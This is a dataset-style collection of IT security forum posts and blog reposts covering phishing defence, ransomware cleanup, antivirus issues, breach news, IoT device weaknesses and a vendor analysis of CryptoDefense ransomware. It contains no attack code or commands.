of attacks. Imagine getting one of the above emails followed by a text message from the boss requesting the same thing. This would be a hybrid attack leveraging something called “smishing” (SMS phishing).  We’ve all seen or heard of text-messaging based attacks, usually in the form of a text message from a financial institution requesting some sort of account validation or even the IRS threatening to arrest the victim. These attacks are not difficult to perform but can be very effective when combined with an email message like that above.Defending Against These AttacksWhen defending against this type of attack, it’s important to have good email filters in place to hopefully block them before they ever reach the victims. Unfortunately, even the best technology these days struggles to detect and stop these very targeted attacks. They do much better at stopping blanket phishing emails than this sort of thing. Antivirus or endpoint protection really does nothing against this type of attack as there is no malware involved. That leaves you with non-technical solutions in order to make the best impact against these attacks.The first thing to do is to make sure that everyone, especially the senior leadership and folks that deal with this sort of information, are aware of this type of attack and how to spot it. This is where a good security awareness training program really shines. Because this type of attack is so similar to CEO fraud (a.k.a Business Email Compromise or BEC), that training does double duty when it comes to protecting the organization. Potential victims and senior leadership having a good knowledge of this type of attack and how effective it is will go a long way toward getting the second part of your defense established.That second part of the defense is to have a strong policy around handling large amounts of money or sensitive information.  I like to call this the “pick up the phone first” policy and it amounts to exactly that. The policy should state that prior to sending any large amounts of sensitive information or transferring large amounts of funds with short notice, verbal (not text messaging or email) contact will be made with the requester to validate the request.  Furthermore, the recipient of the email making the request should not use any phone numbers included in the requesting email to make the phone contact. They should instead use something like an internally published phone list or a known phone number to make the contact. This keeps the attacker from planting a phone number in the email, making the victim call them for confirmation.This simple “pick up the phone first” policy and the associated training and awareness behind it, can make a huge difference when it comes to protecting your organization against this sort of attack.More InfoIf you would like to get more information about training your staff to be able to identify this attack vector, I check us out at https://www.knowbe4.com. We have a lot of free resources and tools help you stay protected as well as an industry leading security awareness training and simulated phishing platform that you can use to educate your employees on how to spot the latest cyber threats and stay safe online.",12

346203,Antivirus Definition Updates Causing I/O Storm in ESX Environment,"Due to virus definition updates happening 6 times a day from my servers I'm experiencing IO Storms which cause SAN latency issues in my ESX environment.  I used tiered storage with the majority of VMs being stored on slower SATA drives while high priority data is put on 15k SAS drives.  Under 95% of circumstances this works.  We really don't have a lot of I/O activity on the majority of our servers which just store documents.  However, it's the 5% of the time where 40+ VMs are writing new virus definition updates at once that's causing an issue.  Symptoms are disk latencies that have been up to 11s (yes, seconds) at some points.  This results in slow and sometimes unresponsive VMs.I'm using VIPRE business and there's no option (that I know of) to determine the interval of time when a machine checks for definition updates--only the frequency which doesn't matter.  So I've been remediating the issue by moving the ""squeeky wheels""--the machines that users can notice issues on--to my expensive and smaller Tier 1 storage. Anyone else been having this problem?  Anyone else using VIPRE Business in a virtualized environment and have experienced the same issue?  How have you dealt with it?",0

In the article, one speculative reason for the EMR vendor to withhold the information is because of ""disputed or owed fees"". It's still speculation for now, but it just looks like the vendor handled this incorrectly.At the beginning of the article they described the issue as a ""breach""; however it doesn't seem like a breach to me, just another case of a company having no control of their data :^)My boss made an interesting point about how the EMR vendor might have handled this situation better. The vendor could have encrypted the data/database, then give the encrypted data to the dental group and tell them that the vendor will give them the key to decrypt the data/database when the dental group pays any outstanding payments that may exist.Article Link",0

2129326,Fighting Malware (Ransomware),"Hi all,I work for a market research company. Recently (late last year) we installed a telephone VoIP system for our 50+ interviewers. The vendor supplied a standalone server, based on Windows 10 Pro, to host the reporting software for the phone system.Since I am busy with other stuff I ignored this server and let the vendor to maintain it. When someone reported any problem with it my only task was RDP to the server and download LogMeIn123 console based on the access code I got from their support team.I believe you can sense the incoming catastrophe here; I didn't till it was too late very recently.About a week ago a call centre (yes - centre, not center - I'm based in UK :) ) manager approached me saying she cannot create any reports. I followed my usual protocol: logged a call with vendor's support team, waited for their LogMeIn123 console code, RDPd to the server, downloaded the console and gave them the access. That was it.Later that day I got a message from them (not even a call, just a casual message) - ""Hi, we think you have some kind of virus on your server. Can you check it?"". Obviously, I didn't bother replying to them; instead stormed out to the server room, unplugged the machine from the network, plugged mouse, keyboard and monitor and logged in to check what was going on.To my surprise, I noticed multiple windows popped up stating that we were a victim of a ransomware, all our files were encrypted and we need to pay in BitCoins to have them restored. Pretty bad for ""some kind of virus"", don't you think? BTW. I also noticed there was neither anti-virus nor anti-malware installed. Anyway, I made sure this is isolated case and took over the control of the server to restore it to usable state. A pretty nasty piece of software and VERY robust one as well. I wasn't able to do much. All the restore points have been deleted, Administrator account disabled, USB and CD drive blocked. Even Restart and Shut Down option grayed out. On top of that, Recovery Partition (D:)formatted. I wasn't even able to browse internet using Edge or IE. Actually I was surprised that I was able to use Chrome. GOT YA!Since the server was supplied with preinstalled Windows and CMD and Magical Jelly Bean Keyfinder din't work, I had no access to Windows License Key. This took installing Windows from scratch out from the equation.I found a Microsoft tool to re-install the Windows 10 Pro preserving the current license key and decide to give it a go.It worked!Well, I was able to reinstall the Windows .., and ... without specifyin license key, which is good. On the other hand I can see debris all over the place. Many encrypted files are still presend on the hard drive. I consider it (and most of you will agree with me) as unsafe to use. Reformating both partitions and reinstalling Windows from scratch is unquestionable. The thing is that I am not sure if this will be enough.I wrote this post for two reasons.First, is a word of precaution. Never trust anyone to maintain your servers. I know it is entirely my fault. I shouldn't have left anyone on their own with any server on my network ... even if they say ""Don't worry, we will take care of EVERYTHING!"". It is said that the most valuable lessons are the most painful ones. Well, there you go.The second reason is to seek your opinion / expertise.You see, I find this malware to be a very robust piece of software. I am not sure how deeply it has rooted itself. This is a modern server. It has UEFI installed. I understand that even if I format the entire HDD the UEFI is left untouched.My question is:How do I know whether the ransomware has or hasn't installed itself on UEFI for future activatiom?Any input is most appreciated.Thanks guys.",11

If you were not a headline in the 2017 blizzard of cyber breaches, then you’re better off than your peers at Equifax, Dun & Bradstreet, Gmail, Anthem Blue Cross Blue Shield, Verizon, and Hyatt.If you’re following these stories at all, then you’re likely aware you and your organization are possibly wearing a bullseye for hackers and their criminal organizations. If you’re honest about it, you probably are also at least a little worried that you may be at risk from the kinds of attacks that beat even leading IT security solutions in 2017.That makes it time to inform your 2018 enterprise strategy and get some expert viewpoints on the lessons learned from 2017 and the best approaches for 2018. Machine learning-powered A.I. had some wins and a lot of press, but it also was shown to fall short in some big cases during the year.Renowned cybersecurity expert and former White House CIO Carlos Solari explains that the current risk profile is very different than when most companies chose their cybersecurity strategy, and he also has been busy researching the new approaches to consider to address the changing 2018 IT security landscape. “A new type of layered security approach is needed and, luckily, the components are out there to examine and test right now.” said Mr. Solari, “We can learn much from the breaches and newly discovered threats of 2017 and an appropriate, actionable plan for 2018 is within reach for all sizes and types of organizations.”PREPARATION SESSION: If you’d like to hear Carlos’ thoughts, and those of long time analyst Marco Coulter, you can join them for a unique, interactive webinar on Wednesday, November 29, 2017 at 1:00pm ET, entitled “Cyberstrategy 2018: Preparing for the Worst” - register here!After a short 2017 threat review and strategy briefing from Carlos, he will sit down with host and long-time industry analyst Marco Coulter to expand on some of his experiences in the White House and discuss a tiered security model, along with the where and what of security architectures.

844178,New biometric authentication tech uses your heartbeat as your password,"Bionym, a tech company based in Toronto, has introduced a new biometric authentication tool for financial institutions, which uses an individual's heartbeat and electrocardiogram to ""log into all their accounts without passwords and pin codes."" According to SC Magazine, the new biometric verification technology makes use of a ""watch-like wristband, called the Nymi band"" that measures an individual's heart and electrocardiogram levels to create a user profile. Each Nymi band has Bluetooth capability, which allows it to be paired with a smart phone and enables mobile banking. If the profile does not match, the device immediately shuts down. The Nymi band is, at present, being ""trialed in the UK by Halifax bank,"" which has turned away from other biometric tools like fingerprint and iris scans following security concerns. Whether or not your heartbeat can be falsified has not yet been answered yet; Halifax and Bionym, however, are confident that it cannot be. ",5

Spam Digest & Mobile Devices,"Hello All,We rolled out phase two of our Sophos deployment over the weekend, our new PureMessage Email Security.  Overall, I am happy with the way things are going. I like the MMC style Dashboard and I prefer the way message security is handled compared to the way we used to do it through our SonicWALL.  Since we are running Exchange Server 2003 (yes yes, an upgrade is on our list), we are using Puremessage Anti-Virus and Anti-Spam 3.1.3.  I am experiencing a couple of difficulties and am having trouble running down the solutions.The Spam Digest email contains a link to each users' Quarantine Digest, where they can choose to approve or delete emails caught by Sophos and flagged as ""Likely Spam.""  Users who access their email from beyond the firewall cannot open the link in the email.  I have tried two or three different solutions found in the Sophos Knowledge Base, and made allowances in my firewall for the correct IP and port number, but it does not seem to have helped.Mobile device users (myself included) are having trouble receiving new emails and sending email replies to and from their Exchange email account while outside the firewall. Personally, I tried to send an email out several times and it kept failing (Android 4.3 mail app configured correctly for Exchange ActiveSync - It worked before I deployed Puremessage).  I also noticed that as soon as I pulled into the parking lot this morning and connected to our WiFi inside the firewall, my work email immediately updated with all of the messages I received overnight and even sent the message I attempted to send yesterday.If anyone has experienced (and, ideally, solved) similar issues on their own networks, I would love to get a friendly nudge in the right direction.  I don't have to tell anyone here in the Spiceworks forums how less-than-fun being a Network Admin can be when the users are unhappy. Multiply this tension by ten, and that's how unhappy my users are when their email doesn't work as expected.Thanks in advance for any advice or suggestions. While I await replies I shall dive back down the rabbit hole in hopes of finding a solution.",0
2125139,4 IRS Scams to Watch Out for This Tax Season,"Written by David BissonIt's that time of year again! Individuals and businesses alike are busy preparing to file their taxes. They have until 17 April, 2018 to file with the U.S. Internal Revenue Service (IRS).The IRS is well-aware of this looming deadline. Just as it knows fraudsters will try to prey upon taxpayers, employers and tax professionals leading up to that date.To protect Americans, the government agency is warning of various tax-related ploys and fraudulent schemes. Here are four types of particular scams that payers, professionals, and businesses should keep an eye out for.Erroneous RefundsThis scam begins after attackers have stolen tax professionals' data and leveraged that information to file fraudulent tax returns in the names of their clients. The bad actors choose to deposit the returns into taxpayers' bank accounts and then contact them claiming they must return a tax refund that was erroneously deposited into their accounts.The IRS has detected multiple variants of this scheme. In one version, criminals pose as a debt collection agency acting on behalf of the IRS. In another, the bad actor poses as an IRS employee and threatens to ""blacklist"" the victim's Social Security Number along with file for an arrest warrant and press criminal charges.Taxpayers who receive a legitimate erroneous refund should work with their financial organization to refund the funds to the IRS. For more information on how to return an erroneous refund, please follow the revenue service's advice here.IRS-Impersonation Telephone CallsAttackers have been impersonating IRS agents for some time now. In the latest variants of this ruse, fraudsters call up unsuspecting taxpayers. They claim to have their tax return and say they just need to verify some of their target's personal and financial information like Social Security Numbers and payment card details.IRS Commissioner John Koskinen notes these newest attacks are just more of the same.""These schemes continue to adapt and evolve in an attempt to catch people off guard just as they are preparing their tax returns,"" explains Koskinen in an IRS consumer alert. ""Don't be fooled. The IRS won’t be calling you out of the blue asking you to verify your personal tax information or aggressively threatening you to make an immediate payment.""To protect themselves against these ploys, taxpayers must remember that...To continue reading, click here. ",0

369868,VIPRE support worse since switch to ThreatTrack?,"So, as a long time VIPRE user at my place of employment (both VIPRE Business and VIPRE Email Security for Exchange) and having over good experience with the product and the support, I'd recommended it to my wife, who is an IT consultant for small businesses. She's recommended it and deployed it to a number of clients, including some of her largest, based on my recommendations and then her good experiences, pre-GFI acquisition. She is not a reseller of anything and makes no money on her clients purchases of one product over the other.Since GFI purchased it, and much more so since VIPRE was spun off as ThreatTrack, the purported ""US Based Techinical Support"" for which the clients paid and were promised as become a joke. There is basically one person answering the phone (Carrey?) and in spite of a serious problem at two clients of hers lately, with identical issues (servers become unusably non-responsive and require 5 minutes just to bring up login prompt) and dispite paid Microsoft Support incidents concluding it was caused by VIPRE, they will not provide phone support. She keeps getting kicked to what is obviously offshore (read ""Phillipines"") support, with no case ownership, and constant suggestions that the problem is not with VIPRE.This is a far cry from how support there used to be.

1013497,"LastPass Data Breach, Is It That Much of a Surprise?","The LastPass data breach has hit all the major IT news outlets.  For those who some how haven't heard yet, some information has been taken from their network.... account email addresses, password reminders, server per user salts, and authentication hashes were compromised...While it's becoming disappointing to see so many companies hit with a breach, I wanted to point out in LastPass'  blog post, how many of their customers are planning on leaving.  My question is, why?  Besides the fact that they felt like their trust has been broken (which is a legit feeling), but I want to ask ﻿why leave a company when they are doing the right thing?﻿I've been a fan of KeePass Password Safe for several years now.  Main reason is because it's the first real password manager I came across, but because I'm in control of the data.  I've thought a few times of switching to LastPass, but never did because I knew a breach was going to happen eventually.  With this breach, LastPass has done everything right.  They encrypted the data, they are public about what happened and they acted quickly.  They've sent out information to their customers and telling everyone to change their master password.  Is it fair for them to lose customers on something that was inevitable?  Seriously, how many thought that LastPass could run for as long as they have without a security incident?  I'm impressed by the fact they've run as far as they have without an issue.  It's a shame, but it's a fact that this is how business is now.  How many of you are planning on leaving LastPass and using a competitor?  If you're staying, why?  Do you finally plan to setup two-factor authentication? http://www.goblinbyte.com/2015/06/lastpass-data-breach-is-it-that-much-of.html﻿",11
450351,Hosted Endpoint Protection service license is expired?,"I give IT support a company who has Symantec Hosted Endpoint Protection as their standard antimalware and firewall solution on workstations, laptops and servers. There are total of 50 nodes installed. Last week one workstation begun to announce that hosted endpoint protection service license is expired. As there are no local management consoles installed - the administration is purely cloud based - I checked the licensing status from the Symantec Cloud. All was well except that particular workstation.I tried the quick and dirty fix - removed the SEP with Clean Wipe and installed with the install package downloaded 6 months ago. No joy. I created fresh install package from the cloud, used Clean Wipe again and installed SEP from fresh package. No joy.It was last friday (21st of Feb.)that I finally created a support ticket. I described the situation: antivirus, SONAR, Intrusion Prevention, all disabled. Connectivity tested - OK, From the policy page, re-enabled security settings - Done -no change. Basically the computer has no protection at all. On monday afternoon the ticket status was ""awaiting customer information"" but no inquiries had passed onto me. After complaining of that the status changed to ""under investigation"" and has been so ever since.I have now a computer without protection - all the other 49 nodes are fine. Symantec is ""investigating""... I wonder if the community could give me a clue where to go next.",0
353085,Why Business Is Losing The War Against Cybercrime,"Need some additional security budget? Here is a brand new survey that might be great ammo.Price Waterhouse (PwC) and CSO Magazine just released their 2013 State of Cybercrime Survey. It shows that lack of risk awareness means companies are poorly defended. This is their 11th survey and the trends are not good. Reason is that cybercrime is skyrocketing but cyber security budgets have not budged and are too low to cope with this new threat.The bad guys are winning the cybercrime war at the moment. It's because the good guys do not understand their enemies and because of that, they are not fighting back effectively. The survey was done over 500 U.S.  executives, security experts and others from both public and private sectors.Proof that awareness is low, is that actual simulated phishing attack results show that an average of 33% of C-level executives are taking the bait and fall for simple or sophisticated spear phishing attacks.""There were no significant changes in C-Suite threat awareness, no spikes in spending on cyber-defense, no breakthroughs in the use of technology to combat cybercrime, and no significant change in the ability of organizations to measure the impact of both cybercrimes committed by insiders and those caused by external cyberattacks,"" the survey reported.That, according to Dave Burg, PwC Global and US advisory cyber security leader, has been the case for a decade. ""(We) have seen virtually no movement by survey respondents in the past 10 years,"" he said.""Possibly the most alarming theme that came out of this year's survey results was that U.S. organizations are misjudging the severity of risks they face from cyber-attacks from a financial, reputational, and regulatory perspective,"" said Bob Bragdon, vice president and publisher, CSO.Over the last five years, cybercrime has gone pro. This is now a 3 Billion dollar industry, with a well-developed underground economy that has escrow services which allow criminals to do buy and sell services and stolen data.IT Security company Trend Micro's recent research showed that 91% of successful data breaches started with a spear-phishing email. This type of social engineering attack can only be repelled by high quality security awareness training for all employees from the Board down to the mail room.",0

789582,Anthem Hack Caused By A Phished System Admin?,"The foreign hackers who stole up to 80 million records from Anthem social engineered their way into the company's network by obtaining the credentials of five tech workers. Thomas Miller, the Anthem's chief information officer said the first sign of the attack came when a systems administrator noticed that a database query was being run using his identifier code although he had not initiated it.Forensics Team Says ""Phishing""The Mandiant forensics team that was called in to investigate the hack now believe the criminals got in through by phishing which tricked the five tech workers into unknowingly revealing a password or downloading a Trojan with a keylogger software.At this point it is thought that the system administrator who was social engineered took over a month to notice that his own credentials were being used. This shows a significant lack of security awareness, as well as a lack of good audit practices.To quote Anthem's website, ""Security awareness training is incorporated into annual compliance training,"" which means that there is no continual security awareness training, and that as we continually see (Home Depot, Target) is no longer  cutting it. This picture is a screen shot from the Anthem website:Don't let this happen to you. It is clear that you need to step all employees (apparently also IT) through effective security awareness training so that this kind of disaster is prevented or at least made very, very hard and bad guys have no luck social engineering employees. ",11

837414,Is IoT in the Smart Home giving away the keys to your kingdom?,"Greetings my connected Spicies...More good stuff from our intrepid Threat Response Team. This time, it is the formidable Candid Wueest doing the business. Let's take a look, shall we?Is IoT in the Smart Home giving away the keys to your kingdom?Symantec analyzed 50 smart home devices and found that many of them included several basic security issues, such as weak authentication and common web vulnerabilities.﻿The Internet of Things (IoT) market has begun to take off. Consumers can buy connected versions of nearly every household appliance imaginable. Gartner predicts that there will be 2.9 billion connected IoT devices in consumer smart home environments in 2015.*However, despite the public’s increased acceptance of the smart home, recent studies seem to agree that “security” is not a word that frequently gets associated with IoT devices, leaving consumers potentially exposed. We recently analyzed 50 smart home devices that are available today and took a look at how they measure up when it comes to security.The connect home landscapeFor our research, we analyzed IoT devices from the following categories:Smart thermostatsSmart locksSmart light bulbsSmart smoke detectorsSmart energy management devicesSmart hubsOur findings could also apply to other IoT devices and smart home products, such as:Security alarmsSurveillance IP camerasEntertainment systems (smart TV, TV set-top boxes, etc.)Broadband routersNetwork attached storage (NAS) devicesSmart home devices may use a back-end cloud service to monitor usage or allow users to remotely control these systems. Users can access this data or control their device through a mobile application or web portal.Our research found that many of these devices and services had several basic security issues.Weak authenticationNone of the devices used mutual authentication or enforced strong passwords. Even worse, some hindered the user from setting up a strong password on the cloud interface by restricting the authentication to a simple four-number PIN code. Combine this with no support for two-factor authentication (2FA) and no password brute-force attack mitigation, and you have an easy target for attackers.Web vulnerabilitiesIn addition to weak authentication, many smart home web interfaces suffer from well-known web application vulnerabilities. A quick test with 15 IoT cloud interfaces revealed some severe vulnerabilities and this check only scratched the surface. We found and reported ten vulnerabilities related to path traversal, unrestricted file uploading (remote code execution), remote file inclusion (RFI), and SQL injection. And we’re not just talking about smart light bulbs here; one of the affected devices was a smart door lock, which we could be opened remotely over the internet without even knowing the password.Local attacksAttackers who have gained access to the home network, for example by breaking into a Wi-Fi network with weak encryption, have further attack vectors at their disposal. We looked at devices that locally transmit passwords in clear text or don’t use any authentication at all. The use of unsigned firmware updates is also a common trait among IoT devices. This security faux pas allows an attacker, with the ability to sniff the home network for IoT device passwords. These stolen credentials can then be used to execute other commands and even take over the device completely by updating it with a malicious firmware update.Potential for attacksAs yet, we haven’t seen any widespread malware attacks targeting smart home devices, apart from computer-related devices such as routers and network-attached storage appliances. Currently, most proposed IoT attacks are proof-of-concepts and have yet to generate any profit for attackers. This doesn’t mean that attackers won’t target IoT devices in the future when the technology becomes more mainstream.From the past, we know that attackers are nothing if not creative and will always conjure up new attack methods. Even if it’s just to misuse the technology, blackmail the user, or have a persistent anchor in a home network, cybercriminals are always ready and eager to attack any target they can.So before you get carried away with your new smart home automation projects, take a moment to think about how these conveniences may be exposing you and your home to cyberattacks.  Demand better security from the manufacturers of your smart home and IoT devices−only then will things start to improve.If you want to read more of our analysis on smart home devices, you can read our whitepaper.MitigationUnfortunately, it’s difficult for a user to secure their IoT devices themselves, as most devices don’t provide a secure mode of operation. Nonetheless, users should adhere to the following advice to ensure that they reduce the risk of a potential attack:Use strong and unique passwords for device accounts and Wi-Fi networksChange default passwordsUse a stronger encryption method when setting up Wi-Fi networks, such as WPA2Disable or protect remote access to IoT devices when not neededUse wired connections instead of wireless where possibleUse devices on a separate home network when possibleBe careful when buying used IoT devices, as they may have been tampered withResearch the vendor’s device security measuresModify the privacy and security settings of the device to your needsDisable features that aren’t neededInstall updates when they become availableEnsure that an outage, for example due to jamming or a network failure, does not result in a unsecure state of the installationVerify if the smart features are really required or if a normal device would be sufficientAs a security industry leader, Symantec helps various IoT device manufacturers with building secure IoT devices. Vendors should consider the following five fundamental tenets when developing new devices:Strong trust model for IoT–e.g. device authentication through SSLProtecting the code that drives IoT–e.g. digital code signingEffective host-based protection for IoT–e.g. endpoint protection and system hardeningSafe and effective management for IoT–e.g. configuration and over-the-air updatesSecurity analytics to address new and advanced threats−e.g. anomaly detection﻿*Gartner Press Release, Gartner Says 4.9 Billion Connected ""Things"" Will Be in Use in 2015, published November 11, 2014,﻿﻿Some folks may be sick to death of hearing about IoT, but it isn't going away. We have to think about the vulnerabilities and how to protect ourselves and others.If you have any questions, HOLLAH!EXCELSIOR",0

1113009,14-year-old security flaw in SMB relay resurfaces in Windows,"At this week's Black Hat security conference, two security researchers demonstrated how a security vulnerability that Microsoft patched 14 years ago can still be remotely exploited by attackers. The vulnerability affects the SMB file-sharing protocol in Windows. Dark Reading reports that Microsoft's original patch was ""a partial fix because it based the patch on the fact that the attacker must already be on the local network."" The fact that the patch was only designed to secure local network connections is a testament to the paradigmatic shift: In 2001, the Internet was still in its early stages; now, the Internet is everywhere and cyberattacks have become more sophisticated in their breadth and scope. As it stands, the vulnerability affects ""Internet Explorer running on all version of Windows,"" including Windows 10. Microsoft Edge is also affected, which Dark Reading notes is the first publicly disclosed security flaw in Windows 10. SMB relay attacks ""rely on a design flaw in the protocol which has Windows systems save credentials and pass them on to other authentication attempts."" This means the vulnerability could adversely affect SMB and enterprise users, who routinely rely on automated systems that collected authentication credentials. ""The ideal victim,"" according to Dark Reading, ""would be one with no firewall on the computer or router, who lets SMB traffic in."" Chrome users are not vulnerable at this time, unless they have added plugins that use SMB. ",11

1407384,CEO Fraud Costs Boeing Vendor 54 Million Dollars,"Effective security awareness training for your high-risk employees is becoming a major priority. The accounting team of FACC, who design and manufacture aircraft components for Boeing and Airbus were social engineered to transfer around 54 million dollars to a foreign bank.They disclosed on their blog that they had become a victim of""a crime act using communication- information and information technologies.""  Other things mentioned were that their board immediately involved the Criminal Investigation Department and engaged a forensic investigation. The cyberattack activities were executed from outside of the company.They continued with: ""The financial accounting department of FACC Operations GmbH was the target of cyber fraud. FACC’s IT infrastructure, data security, IP rights as well as the operational business of the group are not affected by the criminal activities. The damage is an outflow of approx. EUR 50 million of liquid funds. The management board has taken immediate structural measures and is evaluating damages and insurance claims.”Good luck with that. Cyber insurance policies tend not to cover this type of social engineering scam, see the article below. CEO Fraud, also known as Business Email Compromise (BEC) is a highly sophisticated Internet scam that penetrates one or more email accounts of employees in accounting departments, lurks for months and figures out policy and procedures, and then waits until the CEO is out on business travel before the scam kicks into gear. The scams are proportional to regular wire transfers so that the transaction does not raise eyebrows.""BEC attackers target senior-level employees rather than consumers as it’s easier to scam them out of large amounts. In one incident, we observed the scammers asking the target to transfer over 370,000 dollars. By requesting large amounts of money, the scammers only need to be successful a couple of times to make a profit,""Symantec researchers explained. They continued with: ""The FBI estimates that the amount lost to BEC between October 2013 and August 2015 was over 1.2 billion. With such huge returns, it’s unlikely that these scams will cease any time soon."" C-level employees, especially CEOs and CFOs, have to be aware of the various techniques the scammers are using to trick them into wiring out large amounts of money. Effective security awareness training is a must these days. The KnowBe4 integrated training and simulated phishing platform enables your security team to simulate CEO Fraud attacks and make sure that the Accounting team is inoculated against these attacks.﻿",12

The company’s telemetry data also showed significant detection rates for this threat in Canada and the U.S.JS/Danger.ScriptAttachment can download various malware programs, but recently it has been used to primarily distribute Locky, a widespread, malicious program that uses strong encryption to hold users’ files hostage.While Locky doesn’t have any known flaws that would allow users to decrypt their files for free, security researchers from Bitdefender have developed a free tool that can prevent Locky infections in the first place. The tool makes the computer appear as if it’s already infected by Locky by adding certain harmless flags, which tricks the malware into skipping it.The use of JavaScript-based attachments to distribute Locky began earlier this year, prompting Microsoft to post an alert about it in April.The attachments are usually .zip archive files that contain .js or .jse files inside. These files with will execute directly on Windows without the need of additional applications.However, it is very uncommon for people to send legitimate applications written in JavaScript via email, so users should avoid opening this kind of files.""  ",11

2015469,"Poll: If given the opportunity, would you go to Black Hat 2017?","Next week, Las Vegas will play host to the 20th annual Black Hat USA conference and security professionals, vendors, IT pros, and a smattering of tech journalists will gather to sit through talks, demonstrations, and participate in a little bit of old fashioned hacking. Taking place between July 22nd through July 27th, the conference will undoubtedly make a few headlines, some sensational and some eye opening. Take last year's Black Hat conference: From a hacked Jeep Cherokee to a botnet comprised of Phillips Hue lightbulbs to Apple's introduction of a new bug bounty program, the event put a spotlight on weaknesses in the industry. And that's a good thing, according to Andrew Newman, the CEO and founder of the security vendor Reason Software Company. ""They have a lot of experts, a lot of valuable sessions, and it’s great to hear what other folks in the security industry are doing,"" Newman tells Spiceworks, noting that he tries to go every year. ""They also have this thing called an arsenal, which is a bunch of different tools researchers show off to the public."" Speaking with Spiceworks, Stu Sjouwerman, the CEO of the security firm KnowBe4, calls Black Hat an early warning system for future problems. ""Yes, it’s sensational at times, but it puts a spotlight on issues to pay attention to,"" he says. ""Yes, hacking cars is interesting and fun until there comes a point at which a hacker turns your brakes off when you’re doing 80 miles per hour on the highway."" (If you're going to Black Hat 2017, we need your help: Message us at editorial@spiceworks.com to share your insights and perspective before, during, and after the conference!) And with a number of high-profile attacks this year suspected of being the work of nation-state actors — here's looking at your WannaCry and NotPetya — the conference seems more timely than ever. ""We heard a lot of the insecurity of industrial systems in the last few years, and now we’re beginning to see open attacks against them in the wild,"" Newman tells Spiceworks. ""This stuff is really scary and it was just a proof of concept at Black Hat a few years ago."" Unsurprisingly, the recently published annual Black Hat Attendee survey shows that security professionals are increasingly concerned about major breaches in the next two years. Moreover, only 26 percent think the U.S. government has the tools to protect itself from a major attack. In an effort to better understand the lay of the land in the world of security, Spiceworks will be covering this year's Black Hat conference by speaking with industry experts about what IT should be focusing on and what the biggest pain points are in 2017. But as we talk to security experts, we also need IT pros to feed us questions and concerns. And for those IT pros who are going to Black Hat 2017, we want your help to be our boots on the ground and tell us what strangeness you're seeing there in person. But we also want to know the answer to something more basic: If given the opportunity, would you go to Black Hat 2017? More specifically, if money and time off were no concern, would you put yourself in a convention center full of hackers? ",11

MSE has been rated quite highly in a lot of tech magazines, but is it enough?I have installed crypto prevent now and will be checking regularly it is up to date.I also scan the free malware bytes regularly myself as we cannot afford to have the pro version on several machines.What do you think? How would you manage IT for a company on the cheap?I think our biggest problem is we have lots of emails coming through containing zipped files and scams which seem to be increasingly more common despite having AV installed. Am I alone in this or is this common too?A good way to trap these emails would be good, our email is with a 3rd party and again adding more AV to the email or protection would cost too much for us.I know you can't put a price on the security, but currently my time is allocated so if I can take manual steps myself this doesn't cost the firm any extra.I'm not even convinced that a paid for AV solution would be much better really.Hope someone can give me some advice or knowledge thank you in advance.",0

Now my issue is that it takes 2 tapes to do a backup, I've calculated that it should be fine on one tape, so once the job was done I checked out both tapes, tape 2 was 82.4 GB out of 1.39 TB. Since I don't believe that I used over 1.39 I checked the first tape and it's at 196 GB out of 1.39 TB.I checked and I do not have any eject media operations at all, not even once the last server is backed up. I do have a few servers that cannot back up due to correct files encountered and one die to it being powered off. Anyone have any ideas why this is happening? I have the first backup of the day set to overwrite media, the rest append. The tapes are reused, after a period of time, should I be setting a long erase?

467102,"CryptoDefense, the CryptoLocker Imitator, Makes Over $34,000 in One Month","Seriously...I think I'm in the wrong business.  It's like playing Wac-a-Mole with this stuff.Our personal team of Security Avengers - the Symantec Security Response team - just dropped a blog on the latest Crypto-nonsense.  These cats are making serious money just by irritating the masses.  Dig it:﻿CryptoDefense, the CryptoLocker Imitator, Makes Over$34,000 in One MonthOn the back of Cryptolocker’s (Trojan.Cryptolocker)perceived success, malware authors have been turning their attention to writingnew ransomcrypt malware. The sophisticated CryptoDefense (Trojan.Cryptodefense)is one such malware. CryptoDefense appeared in late February 2014 and sincethat time Symantec telemetry shows that we have blocked over 11,000 uniqueCryptoDefense infections. Using the Bitcoin addresses provided by the malwareauthors for payment of the ransom and looking at the publicly available Bitcoinblockchain information, we can estimate that this malware earned cybercriminalsover $34,000 in one month alone (according to Bitcoin valueat time of writing).Imitation“Imitation is not just the sincerest form of flattery - it's the sincerestform of learning” – George Bernard Shaw.CryptoDefense, in essence, is a sophisticated hybriddesign incorporating a number of effective techniques previously used by otherransomcrypt malware authors to extort money from victims. These techniquesinclude the use of Tor and Bitcoins for anonymity, public-keycryptography using strong RSA 2048 encryptionin order to ensure files are held to ransom, and the use of pressure tacticssuch as threats of increased costs if the ransom is not paid within a shortperiod of time. However, the malware author’s poor implementation of thecryptographic functionality has left their hostages with the key to their ownescape.Infection Symantec has observed CrytoDefense being spammed out using emails such as theone shown in Figure 1.Figure 1. Malicious spam emailexampleNetwork communicationsWhen first executed, CryptoDefense attempts to communicate with one of thefollowing remote locations:machetesraka.commarkizasamvel.comarmianazerbaijan.comallseasonsnursery.comThe initial communication contains a profile of theinfected computer. Once a reply is received from the remote location, thethreat then initiates encryption and transmits the private key back to theserver. Once the remote server confirms the receipt of the private decryptionkey, a screenshot of the compromised desktop is uploaded to the remotelocation.Ransom demandOnce the files are encrypted, CryptoDefense creates the following ransom demandfiles in every folder that contains encrypted files:HOW_DECRYPT.TXTHOW_DECRYPT.HTMLHOW_DECRYPT.URLFigure 2. Example ofHOW_DECRYPT.HTML fileAs can be seen in Figure 2, the malware authors are usingthe Tor networkfor payment of the ransom demand. If victims are not familiar with what the Tornetwork is, they even go as far as providing instructions on how to download aTor-ready browser and enter the unique Tor payment Web page address. The use ofthe Tor network conceals the website’s location and provides anonymity andresistance to take down efforts. Other similar threats, such as Cryptorbit (Trojan.Nymaim.B),have used this tactic in the past.Payment Once the user opens their unique personal page provided in the ransom demandusing the Tor Browser, they will be presented with a CAPTCHA page.Figure 3. Example of CAPTCHA shownto victimOnce they have filled in the CAPTCHA correctly, the userwill be presented with the ransom payment page.Figure 4. CryptoDefense ransompayment pageOf note here is the ransom demand of 500 USD/EUR to bepaid within four days or the ransom doubles in price. The use of time pressuretactics by the cybercriminals makes victims less likely to question thecosts involved when evaluating potential losses. The cybercriminals offerproof through a “My screen” button, included on the payment page, that theyhave compromised the user’s system by showing the uploaded screenshot of thecompromised desktop. They also offer further proof that decryption is feasibleby allowing the victim to decrypt one file through the “Test decrypt” button.They then proceed to educate their victim on how to get hold of Bitcoins to paythe ransom.Encryption CryptoDefense employs public-keycryptography using strong RSA 2048 encryption.This means that once the files have been encrypted, without access to theprivate key, victims will not be able to decrypt the files. WithCryptolocker,the 